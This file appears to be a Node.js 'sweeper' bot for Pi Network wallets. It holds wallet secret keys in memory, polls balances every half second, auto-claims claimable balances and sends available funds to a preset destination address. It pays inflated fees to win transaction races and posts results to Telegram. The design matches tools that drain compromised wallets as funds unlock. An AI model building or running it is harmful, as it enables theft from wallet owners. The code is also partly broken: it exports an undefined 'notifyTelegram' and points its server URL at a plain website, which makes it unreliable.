'use strict';

const StellarSdk = require('@stellar/stellar-sdk');

const HORIZON_URL = 'https://minepi.com';
const NETWORK_PASSPHRASE = 'Pi Network';
const MASTER_DESTINATION = process.env.SWEEP_DESTINATION_ADDRESS || '';
const POLL_INTERVAL_MS = Math.max(100, Number(process.env.SWEEP_POLL_INTERVAL_MS || 500));
const MIN_THRESHOLD = Number(process.env.SWEEP_MIN_THRESHOLD || 0.002);

const server = new StellarSdk.Horizon.Server(HORIZON_URL);
const walletLocks = new Set();
let monitorRunning = false;
let monitorTimeoutId = null;

const liveWalletsMap = new Map();
const memoryTransactionLog = []; // Holds transaction audits safely in memory logs

function getErrorDetails(error) {
  if (error?.response?.data?.extras?.result_codes) {
    return JSON.stringify(error.response.data.extras.result_codes);
  }
  return error?.response?.data?.title || error?.message || String(error);
}

const WalletManager = {
  addLiveWallet({ id, publicKey, secretKey, destination, label, chatId, customAmount }) {
    liveWalletsMap.set(String(id), { 
      id, 
      publicKey, 
      secretKey, 
      destination: destination || null, 
      label, 
      chatId,
      customAmount: customAmount ? Number(customAmount) : null,
      lastMessageId: null
    });
    console.log(`[Sweeper INFO] Wallet Box #${id} mapped successfully into RAM memory.`);
  },
  
  removeLiveWallet(id) {
    return liveWalletsMap.delete(String(id));
  },

  getLiveWallets() {
    return Array.from(liveWalletsMap.values());
  }
};

async function updateStatusBoard(bot, wallet, statusText) {
  if (!bot || !wallet.chatId) return;
  try {
    await bot.sendMessage(wallet.chatId, statusText, {
      parse_mode: 'HTML',
      disable_web_page_preview: true
    });
  } catch (error) {
    console.error('[Sweeper ERROR] Telegram notification failure:', error.message);
  }
}

const SweeperEngine = {
  async autoClaimMoveBalances(publicKey, sourceKeypair, baseFee) {
    try {
      const claimablePage = await server.claimableBalances().claimant(publicKey).call();
      if (!claimablePage.records || claimablePage.records.length === 0) return;

      for (const record of claimablePage.records) {
        try {
          const freshAccount = await server.loadAccount(publicKey);
          const tx = new StellarSdk.TransactionBuilder(freshAccount, {
            fee: String(baseFee * 25), 
            networkPassphrase: NETWORK_PASSPHRASE
          })
          .addOperation(StellarSdk.Operation.claimClaimableBalance({ balanceId: record.id }))
          .setTimeout(10).build();

          tx.sign(sourceKeypair);
          await server.submitTransaction(tx);
          console.log(`[Sweeper SUCCESS] Auto-Move executed for balance: ${record.id}`);
        } catch (e) {
          continue;
        }
      }
    } catch (err) {}
  },

  async evaluateBalance(publicKey) {
    const account = await server.loadAccount(publicKey);
    const native = account.balances.find(b => b.asset_type === 'native' || b.asset_code === 'PI' || b.asset_code === 'Pi');
    if (!native) return { spendable: 0, total: 0, verified: false };

    const ledgerTotal = Number(native.balance || 0);
    let locked = Number(native.locked_balance || native.authorized_to_maintain_liabilities || 0);
    return { spendable: Math.max(0, ledgerTotal - locked), total: ledgerTotal, verified: true };
  },

  async executeInstantSweep(bot, wallet) {
    const id = String(wallet.id);
    if (walletLocks.has(id)) return;
    walletLocks.add(id);

    try {
      const activeDestination = wallet.destination || MASTER_DESTINATION;
      if (!activeDestination) {
        await updateStatusBoard(bot, wallet, `❌ <b>CONFIGURATION FAULT</b>\n📦 Box: #${id}\nTarget routing address is completely missing.`);
        return;
      }

      const sourceKeypair = StellarSdk.Keypair.fromSecret(wallet.secretKey);
      let baseFee = 100;
      try { baseFee = await server.fetchBaseFee(); } catch (e) { baseFee = 100; }

      await this.autoClaimMoveBalances(wallet.publicKey, sourceKeypair, baseFee);

      let currentAvailable = 0, totalLedgerPool = 0, isNodeError = false, nodeErrorMsg = '';

      try {
        const evalResult = await this.evaluateBalance(wallet.publicKey);
        currentAvailable = evalResult.spendable;
        totalLedgerPool = evalResult.total;
      } catch (err) {
        isNodeError = true;
        nodeErrorMsg = getErrorDetails(err);
      }

      if (isNodeError) {
        await updateStatusBoard(bot, wallet,
          `📡 <b>NODE CONNECTION FAULT</b>\n📦 Box ID: #${wallet.id}\n` +
          `❌ Error Code: <code>${nodeErrorMsg}</code>\n` +
          `🔧 <i>Action: Retrying endpoint handshakes automatically...</i>`
        );
        return;
      }

      await updateStatusBoard(bot, wallet, 
        `🔍 <b>MONITOR CORE LOG</b>\n📦 Box ID: #${wallet.id}\n` +
        `💰 Available Balance: <code>${currentAvailable.toFixed(7)} Pi</code>\n` +
        `📊 Ledger Total Pool: <code>${totalLedgerPool.toFixed(7)} Pi</code>\n` +
        `📡 <i>Status: Actively polling target parameters...</i>`
      );

      if (currentAvailable <= MIN_THRESHOLD) return;

      let targetAmount = 0;
      let isFixedStrategy = false;

      if (wallet.customAmount && wallet.customAmount > 0) {
        targetAmount = wallet.customAmount;
        isFixedStrategy = true;
      } else if (currentAvailable > 1.0) {
        targetAmount = currentAvailable - 1.0;
      } else {
        targetAmount = currentAvailable - 0.02;
      }

      if (targetAmount <= 0) return;

      let success = false, sweptAmount = 0, txHash = '', errorReason = '';

      try {
        const freshAccount = await server.loadAccount(wallet.publicKey);
        const transaction = new StellarSdk.TransactionBuilder(freshAccount, {
          fee: String(baseFee * 30), 
          networkPassphrase: NETWORK_PASSPHRASE
        })
        .addOperation(StellarSdk.Operation.payment({
          destination: activeDestination,
          asset: StellarSdk.Asset.native(),
          amount: targetAmount.toFixed(7)
        }))
        .setTimeout(10).build();

        transaction.sign(sourceKeypair);
        const response = await server.submitTransaction(transaction);
        sweptAmount = targetAmount;
        txHash = response.hash;
        success = true;
      } catch (err) {
        errorReason = getErrorDetails(err);
      }

      if (success) {
        const remainingPool = Math.max(0, currentAvailable - sweptAmount);
        memoryTransactionLog.push({ id, sweptAmount, txHash, timestamp: new Date().toISOString() });
        
        await bot.sendMessage(wallet.chatId, 
          `🚀 <b>TRANSFER SUCCESSFUL!</b>\n\n` +
          `📦 <b>Box ID:</b> #${wallet.id}\n` +
          `💰 <b>Swept Amount:</b> <code>${sweptAmount.toFixed(7)} Pi</code>\n` +
          `📉 <b>Remaining Pool:</b> <code>${remainingPool.toFixed(7)} Pi</code>\n` +
          `🔗 <b>Tx Hash:</b> <code>${txHash}</code>`
        );
      }
    } catch (criticalError) {
      console.error(`[Sweeper ERROR] Critical exception on Box #${id}:`, criticalError.message);
    } finally {
      walletLocks.delete(id);
    }
  }
};

function startSweeperEngine(bot) {
  if (monitorRunning) return;
  monitorRunning = true;

  const corePollingCycle = async () => {
    if (!monitorRunning) return;
    try {
      const wallets = WalletManager.getLiveWallets();
      for (const wallet of wallets) {
        await SweeperEngine.executeInstantSweep(bot, wallet);
      }
    } catch (err) {
      console.error('[Sweeper ERROR] Core daemon exception:', err.message);
    }
    if (monitorRunning) monitorTimeoutId = setTimeout(corePollingCycle, POLL_INTERVAL_MS);
  };
  corePollingCycle();
}

function stopSweeperEngine() {
  monitorRunning = false;
  if (monitorTimeoutId) clearTimeout(monitorTimeoutId);
}

module.exports = { WalletManager, startSweeperEngine, stopSweeperEngine, notifyTelegram };
